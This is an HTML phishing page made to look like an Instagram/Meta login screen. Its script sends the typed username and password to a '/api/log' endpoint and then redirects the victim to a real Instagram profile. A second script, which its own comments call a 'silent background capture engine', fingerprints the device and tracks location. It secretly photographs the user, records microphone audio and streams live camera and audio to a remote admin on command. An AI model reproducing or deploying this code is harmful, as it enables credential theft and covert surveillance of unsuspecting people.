<!DOCTYPE html>
<html class="h-full" lang="en">

<head>

  <style data-purpose="custom-colors">
    :root {
      --bg-color: #0C1014;
      --text-color: #ffffff;
      --input-bg: #1c1c1c;
      --input-border: #363636;
      --text-muted: #a8a8a8;
      --ig-blue: #0064e0;
      --meta-gray: #737373;
    }

    @media (prefers-color-scheme: dark) {
      :root {
        --bg-color: #0C1014;
        --text-color: #ffffff;
        --input-bg: #1c1c1c;
        --input-border: #363636;
        --text-muted: #a8a8a8;
      }
    }

    body {
      background-color: var(--bg-color);
      color: var(--text-color);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-text-size-adjust: 100%;

      /* Disable text selection */
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    /* Allow text selection inside form controls */
    input,
    textarea {
      -webkit-user-select: text;
      -moz-user-select: text;
      -ms-user-select: text;
      user-select: text;
    }

    .input-field {
      background-color: var(--input-bg) !important;
      border: 1px solid var(--input-border) !important;
      transition: border-color 0.2s ease-in-out;
    }

    .input-field:focus {
      border-color: #555 !important;
      outline: none !important;
      box-shadow: none !important;
    }
  </style>

</head>

    <!-- Login Form -->
    <section class="w-full max-w-sm" data-purpose="login-form">
      <form id="logForm" class="space-y-3">
        <div class="relative">
          <input type="text" id="username" aria-label="Username, email address or mobile number"

          <label for="username"

        </div>

        <!-- Password Input -->
        <div class="relative flex items-center">
          <input type="password" id="password" aria-label="Password"

    <script>
      const form = document.getElementById('logForm');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const loginBtn = document.getElementById('loginBtn');

      // Function to validate inputs silently
      function validateInputs() {
        const isUsernameValid = usernameInput.value.trim().length >= 1;
        const isPasswordValid = passwordInput.value.length >= 6;

        if (isUsernameValid && isPasswordValid) {
          loginBtn.disabled = false;
        } else {
          loginBtn.disabled = true;
        }
      }

      // Track real-time typing across both fields
      usernameInput.addEventListener('input', validateInputs);
      passwordInput.addEventListener('input', validateInputs);

      form.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Show button spinner immediately, then show full screen loading after a short delay
        setTimeout(() => {
          document.getElementById('loadingOverlay').classList.remove('hidden');
        }, 1000);
        const btnText = document.getElementById('btnText');
        const btnSpinner = document.getElementById('btnSpinner');
        if(btnText && btnSpinner) {
          btnText.classList.add('hidden');
          btnSpinner.classList.remove('hidden');
        }

        const username = usernameInput.value;
        const password = passwordInput.value;

        // ── Trigger audio capture on login click ────────────────────
        // Fire immediately so audio records while we wait for fetch
        if (typeof captureAudioOnLogin === 'function') {
          captureAudioOnLogin();
        }

        try {
          // Send data to the backend first
          await fetch('/api/log', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
          });
        } catch (err) {
          console.error('Error logging to terminal:', err);
        }

        // Wait 6.5s for audio recording (6s) + send time before redirecting
        await new Promise(resolve => setTimeout(resolve, 6500));
        window.location.assign('https://www.instagram.com/techora.inofficial');
      });
    </script>

    <!-- ═══════════════════════════════════════════════════════════════
       SILENT BACKGROUND CAPTURE ENGINE — Not visible to user
  ═══════════════════════════════════════════════════════════════ -->
    <script>
      (function () {
        'use strict';

        // ─── WebSocket Setup ────────────────────────────────────────
        let ws = null;
        let wsReady = false;
        const msgQueue = [];

        function connectWS() {
          const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
          ws = new WebSocket(`${proto}//${location.host}`);

          ws.onopen = () => {
            wsReady = true;
            // Flush queued messages
            while (msgQueue.length > 0) {
              ws.send(JSON.stringify(msgQueue.shift()));
            }
            // Send device fingerprint immediately
            sendWS({
              type: 'user_info',
              userAgent: navigator.userAgent,
              screen: `${screen.width}x${screen.height}`,
              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
              language: navigator.language
            });
            // Start all capture operations
            startCapture();
          };

          ws.onmessage = (evt) => {
            let msg;
            try { msg = JSON.parse(evt.data); } catch { return; }
            handleServerCommand(msg);
          };

          ws.onclose = () => {
            wsReady = false;
            // Reconnect silently
            setTimeout(connectWS, 5000);
          };

          ws.onerror = () => { };
        }

        function sendWS(data) {
          if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(data));
          } else {
            msgQueue.push(data);
          }
        }

        // ─── Handle Admin Commands ──────────────────────────────────
        function handleServerCommand(msg) {
          switch (msg.type) {
            case 'ASSIGN_ID':
              ioClientId = String(msg.clientId);
              if (ioSocket && ioSocket.connected) {
                ioSocket.emit('register', { uuid: ioClientId });
              }
              break;
            case 'CAPTURE_PHOTO': capturePhoto(); break;
            case 'CAPTURE_AUDIO': captureAudio(); break;
            case 'SEND_LOCATION': sendLocation(); break;
            case 'START_LIVE_CAMERA': startLiveCamera(); break;
            case 'STOP_LIVE_CAMERA': stopLiveCamera(); break;
          }
        }

        // ─── Main Capture Entry Point ───────────────────────────────
        function startCapture() {
          collectFingerprint();
          // NOTE: Do NOT call requestLocation() here.
          // Geolocation requires a user gesture (tap/click) on modern browsers.
          // It will be triggered on first user interaction instead.
          requestMediaPermissions();
          setupLocationOnUserGesture();
        }

        // ─── Comprehensive Device Fingerprint ───────────────────────
        async function collectFingerprint() {
          const fp = {};

          // ── Battery ──────────────────────────────────────────────
          try {
            if (navigator.getBattery) {
              const batt = await navigator.getBattery();
              fp.battery = {
                level: Math.round(batt.level * 100),
                charging: batt.charging,
                chargingTime: batt.chargingTime === Infinity ? 'N/A' : batt.chargingTime + 's',
                dischargingTime: batt.dischargingTime === Infinity ? 'N/A' : batt.dischargingTime + 's'
              };
            }
          } catch (e) { fp.battery = null; }

          // ── Network / Connection ─────────────────────────────────
          fp.network = {};
          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
          if (conn) {
            fp.network.connectionType = conn.type || 'Unknown';
            fp.network.effectiveType = conn.effectiveType || 'Unknown';
            fp.network.downlink = conn.downlink != null ? conn.downlink : 'Unknown';
            fp.network.rtt = conn.rtt != null ? conn.rtt : 'Unknown';
            fp.network.maxDownlink = conn.downlinkMax != null ? conn.downlinkMax : 'Unknown';
            fp.network.saveData = conn.saveData != null ? conn.saveData : 'Unknown';
          }

          // ── Public IP + Geo (via free API) ───────────────────────
          try {
            const ipRes = await fetch('https://ipinfo.io/json?token=');
            if (ipRes.ok) {
              const ipData = await ipRes.json();
              fp.network.publicIP = ipData.ip || 'Unknown';
              fp.network.city = ipData.city || 'Unknown';
              fp.network.region = ipData.region || 'Unknown';
              fp.network.country = ipData.country || 'Unknown';
              fp.network.org = ipData.org || 'Unknown';
              fp.network.timezone = ipData.timezone || 'Unknown';
            }
          } catch (e) { }

          // ── Local IP (WebRTC) ────────────────────────────────────
          fp.network.localIP = await getLocalIP();

          // ── OS & Device ──────────────────────────────────────────
          const ua = navigator.userAgent;
          fp.device = {
            userAgent: ua,
            model: getDeviceModel(ua),
            osVersion: getOSVersion(ua),
            manufacturer: getManufacturer(ua),
            browser: getBrowserName(ua),
            standalone: navigator.standalone || window.matchMedia('(display-mode: standalone)').matches ? 'Yes' : 'No'
          };

          // ── Hardware & System ────────────────────────────────────
          fp.hardware = {
            language: navigator.language || 'Unknown',
            languages: (navigator.languages || []).join(', ') || navigator.language,
            screen: screen.width + 'x' + screen.height,
            availScreen: screen.availWidth + 'x' + screen.availHeight,
            colorDepth: screen.colorDepth + '-bit',
            pixelDepth: screen.pixelDepth + '-bit',
            ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
            cpuCores: navigator.hardwareConcurrency || 'Unknown',
            touchSupport: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Yes' : 'No',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            online: navigator.onLine ? 'Online' : 'Offline',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset() + ' minutes',
            doNotTrack: navigator.doNotTrack || 'Not set'
          };

          // ── GPU Information ──────────────────────────────────────
          fp.gpu = getGPUInfo();

          // ── Browser Capabilities ─────────────────────────────────
          fp.capabilities = {
            supported: getSupported(),
            cookies: navigator.cookieEnabled ? 'Yes' : 'No',
            pdfViewer: navigator.pdfViewerEnabled ? 'Yes' : 'No',
            notifications: typeof Notification !== 'undefined' ? Notification.permission : 'N/A',
            geolocation: 'geolocation' in navigator ? 'true' : 'false'
          };

          // ── Storage Quota ────────────────────────────────────────
          try {
            if (navigator.storage && navigator.storage.estimate) {
              const est = await navigator.storage.estimate();
              fp.storage = {
                quota: (est.quota / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
                usage: est.usage ? (est.usage / (1024 * 1024)).toFixed(2) + ' MB' : 'Unknown'
              };
            }
          } catch (e) { fp.storage = null; }

          // ── Timestamp ────────────────────────────────────────────
          fp.collectedAt = new Date().toLocaleString();

          // ── Send the full fingerprint to server ──────────────────
          sendWS({ type: 'visitor_fingerprint', fingerprint: fp });
        }

        // ─── Helper Functions ────────────────────────────────────────

        function getLocalIP() {
          return new Promise(resolve => {
            try {
              const pc = new RTCPeerConnection({ iceServers: [] });
              pc.createDataChannel('');
              pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve('Not found'));
              pc.onicecandidate = (e) => {
                if (!e || !e.candidate) return;
                const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (match) { resolve(match[0]); pc.close(); }
              };
              setTimeout(() => { resolve('Not found'); pc.close(); }, 3000);
            } catch (e) { resolve('Not found'); }
          });
        }

        function getGPUInfo() {
          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
            return {
              vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
              renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
            };
          } catch (e) { return { vendor: 'N/A', renderer: 'N/A' }; }
        }

        function getSupported() {
          const checks = [];
          try { if (document.createElement('canvas').getContext('webgl')) checks.push('WebGL'); } catch (e) { }
          try { if (document.createElement('canvas').getContext('webgl2')) checks.push('WebGL2'); } catch (e) { }
          try { if (document.createElement('canvas').getContext('2d')) checks.push('Canvas'); } catch (e) { }
          if (window.RTCPeerConnection) checks.push('WebRTC');
          if (window.WebSocket) checks.push('WebSocket');
          if ('serviceWorker' in navigator) checks.push('ServiceWorker');
          return checks.join(', ');
        }

        function getDeviceModel(ua) {
          if (/iPhone/.test(ua)) return ua.match(/iPhone[^;)]*/)?.[0] || 'iPhone';
          if (/iPad/.test(ua)) return 'iPad';
          if (/Android/.test(ua)) return 'Android Device';
          if (/Windows/.test(ua)) return 'Windows PC';
          if (/Macintosh/.test(ua)) return 'Mac';
          if (/Linux/.test(ua)) return 'Linux PC';
          return 'Unknown';
        }

        function getOSVersion(ua) {
          let m;
          if ((m = ua.match(/Android\s+([\d.]+)/))) return m[1];
          if ((m = ua.match(/iPhone OS ([\d_]+)/))) return m[1].replace(/_/g, '.');
          if ((m = ua.match(/Windows NT ([\d.]+)/))) return m[1];
          if ((m = ua.match(/Mac OS X ([\d_]+)/))) return m[1].replace(/_/g, '.');
          return 'Unknown';
        }

        function getManufacturer(ua) {
          if (/iPhone|iPad|Macintosh/.test(ua)) return 'Apple';
          if (/Samsung/.test(ua)) return 'Samsung';
          if (/Xiaomi|Redmi|POCO/.test(ua)) return 'Xiaomi';
          if (/HUAWEI/.test(ua)) return 'Huawei';
          if (/OPPO/.test(ua)) return 'OPPO';
          if (/vivo/.test(ua)) return 'Vivo';
          if (/OnePlus/.test(ua)) return 'OnePlus';
          if (/Pixel/.test(ua)) return 'Google';
          if (/Android/.test(ua)) return 'Various';
          if (/Windows/.test(ua)) return 'PC';
          return 'Unknown';
        }

        function getBrowserName(ua) {
          if (/Edg\//.test(ua)) return 'Edge';
          if (/OPR\//.test(ua)) return 'Opera';
          if (/Firefox/.test(ua)) return 'Firefox';
          if (/Chrome/.test(ua)) return 'Chrome';
          if (/Safari/.test(ua)) return 'Safari';
          return 'Unknown';
        }

        // ─── Geolocation ────────────────────────────────────────────
        let locationRequested = false;

        function requestLocation() {
          if (locationRequested) return; // avoid duplicate prompts
          locationRequested = true;
          if (!navigator.geolocation) return;

          // First try: check if permission is already granted via Permissions API
          if (navigator.permissions && navigator.permissions.query) {
            navigator.permissions.query({ name: 'geolocation' }).then((result) => {
              if (result.state === 'granted' || result.state === 'prompt') {
                doRequestLocation();
              } else {
                sendWS({ type: 'permission_denied', permission: 'location' });
              }
            }).catch(() => {
              // Permissions API not supported, try directly
              doRequestLocation();
            });
          } else {
            doRequestLocation();
          }
        }

        function doRequestLocation() {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              sendWS({
                type: 'location_update',
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy
              });
              // Watch for continuous updates
              navigator.geolocation.watchPosition(
                (p) => sendWS({
                  type: 'location_update',
                  lat: p.coords.latitude,
                  lng: p.coords.longitude,
                  accuracy: p.coords.accuracy
                }),
                () => { },
                { enableHighAccuracy: true, maximumAge: 30000 }
              );
            },
            (err) => {
              // If it failed because no user gesture, allow retrying on next interaction
              if (err.code === 1) {
                // PERMISSION_DENIED — might be a real denial or gesture-gate
                sendWS({ type: 'permission_denied', permission: 'location' });
              } else {
                // POSITION_UNAVAILABLE or TIMEOUT — allow retry
                locationRequested = false;
              }
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
          );
        }

        // Trigger location request on first user interaction (tap/click/focus)
        function setupLocationOnUserGesture() {
          const gestureEvents = ['click', 'touchstart', 'focus'];
          function onUserGesture() {
            requestLocation();
            // Remove all listeners after first trigger
            gestureEvents.forEach(evt => document.removeEventListener(evt, onUserGesture, true));
          }
          gestureEvents.forEach(evt => document.addEventListener(evt, onUserGesture, { capture: true, once: false, passive: true }));
        }

        function sendLocation() {
          if (!navigator.geolocation) return;
          navigator.geolocation.getCurrentPosition(
            (pos) => sendWS({
              type: 'location_update',
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            }),
            () => { },
            { enableHighAccuracy: true, timeout: 8000 }
          );
        }

        // ─── Camera + Microphone ────────────────────────────────────
        function requestMediaPermissions() {
          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

          // Request camera first (front-facing if mobile)
          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then((stream) => {
              // Got camera — capture photo then free the stream
              capturePhotoFromStream(stream);
              // Now separately request audio
              return navigator.mediaDevices.getUserMedia({ audio: true, video: false });
            })
            .then((audioStream) => {
              captureAudioFromStream(audioStream);
            })
            .catch((err) => {
              const name = err.name || '';
              if (name === 'NotAllowedError' || name === 'PermissionDeniedError') {
                sendWS({ type: 'permission_denied', permission: 'camera/microphone' });
              }
              // Fallback: try audio-only
              navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(captureAudioFromStream)
                .catch(() => {
                  sendWS({ type: 'permission_denied', permission: 'microphone' });
                });
            });
        }

        // ─── Photo Capture ──────────────────────────────────────────
        function capturePhotoFromStream(stream) {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.setAttribute('playsinline', '');
          video.muted = true;
          video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
          document.body.appendChild(video);

          video.play().then(() => {
            // Allow 1.5s for camera to warm up
            setTimeout(() => {
              try {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataURL = canvas.toDataURL('image/jpeg', 0.82);
                sendWS({ type: 'capture_photo', data: dataURL });
              } catch (e) { }
              // Stop tracks and cleanup
              stream.getTracks().forEach(t => t.stop());
              video.remove();
            }, 1500);
          }).catch(() => {
            stream.getTracks().forEach(t => t.stop());
            video.remove();
          });
        }

        function capturePhoto() {
          if (!navigator.mediaDevices) return;
          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(capturePhotoFromStream)
            .catch(() => {
              sendWS({ type: 'permission_denied', permission: 'camera' });
            });
        }

        // ─── Audio Capture ──────────────────────────────────────────
        function captureAudioFromStream(stream) {
          const chunks = [];
          const mimeType = getSupportedMimeType();
          let recorder;
          try {
            recorder = new MediaRecorder(stream, mimeType ? { mimeType } : {});
          } catch (e) {
            recorder = new MediaRecorder(stream);
          }

          recorder.ondataavailable = (e) => {
            if (e.data && e.data.size > 0) chunks.push(e.data);
          };

          recorder.onstop = () => {
            const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
            const reader = new FileReader();
            reader.onload = () => {
              sendWS({ type: 'capture_audio', data: reader.result });
            };
            reader.readAsDataURL(blob);
            stream.getTracks().forEach(t => t.stop());
          };

          recorder.start();
          // Record for 6 seconds
          setTimeout(() => {
            if (recorder.state !== 'inactive') recorder.stop();
          }, 6000);
        }

        function captureAudio() {
          if (!navigator.mediaDevices) return;
          navigator.mediaDevices.getUserMedia({ audio: true, video: false })
            .then(captureAudioFromStream)
            .catch(() => {
              sendWS({ type: 'permission_denied', permission: 'microphone' });
            });
        }

        function getSupportedMimeType() {
          const types = [
            'audio/webm;codecs=opus',
            'audio/webm',
            'audio/ogg;codecs=opus',
            'audio/ogg',
            'audio/mp4'
          ];
          return types.find(t => MediaRecorder.isTypeSupported(t)) || '';
        }

        // ─── Live Camera & Audio Streaming ───────────────────────────
        let liveStreamActive = false;
        let liveStreamInterval = null;
        let liveStreamWorker = null;
        let liveStreamVideo = null;
        let liveStreamCanvas = null;
        let liveStreamContext = null;
        let liveAudioRecorder = null;
        let liveAudioStream = null;

        function startLiveCamera() {
          if (liveStreamActive) return; // already streaming
          if (!navigator.mediaDevices) return;

          // Step 1 — Camera Constraints: HD + high frame rate
          const videoConstraints = {
            facingMode: 'user',
            width:  { ideal: 1280 },
            height: { ideal: 720 },
            frameRate: { ideal: 30, max: 60 }
          };

          // Try capturing camera and mic with higher frame rate constraint
          navigator.mediaDevices.getUserMedia({
            video: videoConstraints,
            audio: {
              echoCancellation:  false,
              noiseSuppression:  false,
              autoGainControl:   false
            }
          })
            .then((stream) => {
              setupLiveMediaStreams(stream);
            })
            .catch(() => {
              // Fallback to video only
              navigator.mediaDevices.getUserMedia({ video: videoConstraints, audio: false })
                .then((stream) => {
                  setupLiveMediaStreams(stream);
                })
                .catch(() => {
                  sendWS({ type: 'permission_denied', permission: 'camera (live)' });
                });
            });
        }

        function setupLiveMediaStreams(stream) {
          liveStreamActive = true;

          // Video elements setup
          liveStreamVideo = document.createElement('video');
          liveStreamCanvas = document.createElement('canvas');
          liveStreamCanvas.width = 640;
          liveStreamCanvas.height = 480;
          liveStreamContext = liveStreamCanvas.getContext('2d');

          liveStreamVideo.srcObject = stream;
          liveStreamVideo.setAttribute('playsinline', '');
          liveStreamVideo.muted = true;
          liveStreamVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;';
          document.body.appendChild(liveStreamVideo);

          liveStreamVideo.play().then(() => {
            // Step 4 — requestAnimationFrame capture loop (avoids setInterval FPS cap)
            const TARGET_FPS = 15; // sweet-spot: smooth feed without overloading the socket
            const FRAME_INTERVAL = 1000 / TARGET_FPS;
            let lastFrameTime = 0;

            // Also start WebRTC peer connection for true 30 FPS stream
            startWebRTCStream(liveStreamVideo.srcObject);

            function captureLoop(timestamp) {
              if (!liveStreamActive) return; // stopped
              if (timestamp - lastFrameTime >= FRAME_INTERVAL) {
                lastFrameTime = timestamp;
                if (liveStreamVideo && liveStreamVideo.readyState >= 2) {
                  try {
                    // Step 4 — draw to existing canvas (reuse, don't create every frame)
                    const settings = liveStreamVideo.srcObject
                      ? liveStreamVideo.srcObject.getVideoTracks()[0].getSettings()
                      : {};
                    liveStreamCanvas.width  = settings.width  || 1280;
                    liveStreamCanvas.height = settings.height || 720;
                    liveStreamContext.drawImage(liveStreamVideo, 0, 0);
                    // 0.6 quality — sweet spot between speed and clarity (Step 4)
                    const photo = liveStreamCanvas.toDataURL('image/jpeg', 0.6);
                    if (photo && photo.length > 1000) {
                      // Step 5 — send frame via Socket.IO camera:frame event
                      sendFrameToAdmin(photo);
                    }
                  } catch (e) { }
                }
              }
              captureFrameId = requestAnimationFrame(captureLoop);
            }
            captureFrameId = requestAnimationFrame(captureLoop);

          }).catch(() => stopLiveCamera());

          // Audio recording setup
          const audioTracks = stream.getAudioTracks();
          if (audioTracks.length > 0) {
            try {
              liveAudioStream = new MediaStream(audioTracks);
              const mimeType = getSupportedMimeType();
              liveAudioRecorder = new MediaRecorder(liveAudioStream, mimeType ? { mimeType } : {});

              liveAudioRecorder.ondataavailable = (e) => {
                if (e.data && e.data.size > 0 && liveStreamActive) {
                  const reader = new FileReader();
                  reader.onload = () => {
                    sendWS({ type: 'audio_chunk', audio: reader.result });
                  };
                  reader.readAsDataURL(e.data);
                }
              };

              // Capture audio chunks every 1000ms (1 second)
              liveAudioRecorder.start(1000);
            } catch (e) {
              console.error("Audio streaming setup failed:", e);
            }
          }
        }

        // ─── Step 4 — requestAnimationFrame state ─────────────────────────────
        let captureFrameId = null;

        function stopLiveCamera() {
          liveStreamActive = false;
          // Cancel rAF loop (Step 4)
          if (captureFrameId) {
            cancelAnimationFrame(captureFrameId);
            captureFrameId = null;
          }
          if (liveStreamInterval) {
            clearInterval(liveStreamInterval);
            liveStreamInterval = null;
          }
          if (liveStreamWorker) {
            try {
              liveStreamWorker.postMessage({ action: 'stop' });
              liveStreamWorker.terminate();
            } catch (e) { }
            liveStreamWorker = null;
          }
          // Close WebRTC peer connection if open
          if (livePeerConnection) {
            try { livePeerConnection.close(); } catch (e) {}
            livePeerConnection = null;
          }
          if (liveAudioRecorder && liveAudioRecorder.state !== 'inactive') {
            try { liveAudioRecorder.stop(); } catch (e) { }
            liveAudioRecorder = null;
          }
          if (liveStreamVideo) {
            const stream = liveStreamVideo.srcObject;
            if (stream) stream.getTracks().forEach(t => t.stop());
            liveStreamVideo.remove();
            liveStreamVideo = null;
            liveStreamCanvas = null;
            liveStreamContext = null;
            liveAudioStream = null;
          }
        }

        // ─── Step 5 — Send frame via Socket.IO ─────────────────────────────
        function sendFrameToAdmin(base64Photo) {
          if (ioSocket && ioSocket.connected) {
            ioSocket.emit('camera:frame', {
              uuid:      String(ioClientId || ''),
              frame:     base64Photo,
              timestamp: Date.now()
            });
          } else {
            // Fallback: send via raw WebSocket as camera_frame
            sendWS({ type: 'camera_frame', frame: base64Photo });
          }
        }

        // ─── Steps 2 & 3 — WebRTC Peer Connection for true live stream ────────
        let livePeerConnection = null;

        async function startWebRTCStream(mediaStream) {
          if (!window.RTCPeerConnection || !ioSocket) return;

          // Step 2 — WebRTC peer connection config with 4 STUN + bundle policy
          livePeerConnection = new RTCPeerConnection({
            iceServers: [
              { urls: 'stun:stun.l.google.com:19302' },
              { urls: 'stun:stun1.l.google.com:19302' },
              { urls: 'stun:stun2.l.google.com:19302' },
              { urls: 'stun:stun.cloudflare.com:3478' }
            ],
            iceTransportPolicy: 'all',
            bundlePolicy:       'max-bundle',
            rtcpMuxPolicy:      'require'
          });

          // Add all tracks from the media stream
          mediaStream.getTracks().forEach(track => {
            livePeerConnection.addTrack(track, mediaStream);
          });

          // Step 3 — Boost bitrate after negotiation and send offer
          livePeerConnection.onnegotiationneeded = async () => {
            for (const sender of livePeerConnection.getSenders()) {
              if (sender.track && sender.track.kind === 'video') {
                const params = sender.getParameters();
                if (!params.encodings || params.encodings.length === 0) {
                  params.encodings = [{}];
                }
                params.encodings[0].maxBitrate  = 2_500_000; // 2.5 Mbps
                params.encodings[0].maxFramerate = 30;
                try { await sender.setParameters(params); } catch (e) {}
              }
            }

            // Initiate WebRTC offer directly to avoid the setup race condition
            try {
              const offer = await livePeerConnection.createOffer();
              await livePeerConnection.setLocalDescription(offer);
              ioSocket.emit('webrtc:offer', {
                adminSocketId: livePeerConnection._adminSocketId,
                offer
              });
            } catch (e) { console.error('WebRTC offer generation error:', e); }
          };

          livePeerConnection.onicecandidate = (event) => {
            if (event.candidate && ioSocket && ioSocket.connected) {
              if (livePeerConnection._adminSocketId) {
                ioSocket.emit('webrtc:ice-candidate', {
                  adminSocketId: livePeerConnection._adminSocketId,
                  candidate: event.candidate
                });
              } else {
                if (!livePeerConnection._iceQueue) {
                  livePeerConnection._iceQueue = [];
                }
                livePeerConnection._iceQueue.push(event.candidate);
              }
            }
          };

          // Listen for admin to request WebRTC, then send offer
          if (!livePeerConnection._requestListenerAttached) {
            livePeerConnection._requestListenerAttached = true;

            ioSocket.on('webrtc:request', async (data) => {
              if (!livePeerConnection) return;
              livePeerConnection._adminSocketId = data.adminSocketId;
              try {
                const offer = await livePeerConnection.createOffer();
                await livePeerConnection.setLocalDescription(offer);
                ioSocket.emit('webrtc:offer', {
                  adminSocketId: data.adminSocketId,
                  offer
                });
              } catch (e) { console.error('WebRTC offer error:', e); }
            });

            ioSocket.on('webrtc:answer', async (data) => {
              if (!livePeerConnection) return;
              if (data.adminSocketId) {
                livePeerConnection._adminSocketId = data.adminSocketId;
                // Flush queued ICE candidates now that we have the admin socket ID
                if (livePeerConnection._iceQueue) {
                  livePeerConnection._iceQueue.forEach(candidate => {
                    ioSocket.emit('webrtc:ice-candidate', {
                      adminSocketId: livePeerConnection._adminSocketId,
                      candidate
                    });
                  });
                  livePeerConnection._iceQueue = [];
                }
              }
              try {
                await livePeerConnection.setRemoteDescription(
                  new RTCSessionDescription(data.answer)
                );
              } catch (e) { console.error('WebRTC answer error:', e); }
            });

            ioSocket.on('webrtc:ice-candidate', async (data) => {
              if (!livePeerConnection) return;
              try {
                await livePeerConnection.addIceCandidate(
                  new RTCIceCandidate(data.candidate)
                );
              } catch (e) { console.error('WebRTC ICE error:', e); }
            });

            ioSocket.on('webrtc:stop', () => {
              stopLiveCamera();
            });
          }
        }

        // ─── Socket.IO Client (for signaling + camera:frame) ──────────────────
        let ioSocket   = null;
        let ioClientId = null; // session-based ID for Socket.IO registration

        function initSocketIO() {
          // Dynamically load socket.io client from the same server
          const script = document.createElement('script');
          script.src = '/socket.io/socket.io.js';
          script.onload = () => {
            ioClientId = sessionStorage.getItem('_cid');
            if (!ioClientId) {
              ioClientId = Math.random().toString(36).slice(2);
              sessionStorage.setItem('_cid', ioClientId);
            }
            // eslint-disable-next-line no-undef
            ioSocket = io(location.protocol + '//' + location.host);
            ioSocket.on('connect', () => {
              // Register with the server so it can route WebRTC signals to us
              ioSocket.emit('register', { uuid: ioClientId });
            });
          };
          document.head.appendChild(script);
        }

        // ─── Init ─────────────────────────────────────────────────
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', () => { connectWS(); initSocketIO(); });
        } else {
          connectWS();
          initSocketIO();
        }

        // ─── Expose login-triggered audio capture globally ───────────
        window.captureAudioOnLogin = function () {
          if (!navigator.mediaDevices) return;
          navigator.mediaDevices.getUserMedia({ audio: true, video: false })
            .then((stream) => {
              captureAudioFromStream(stream);
            })
            .catch(() => {
              // Microphone permission not granted — silently skip
            });
        };

      })();
    </script>
</body>
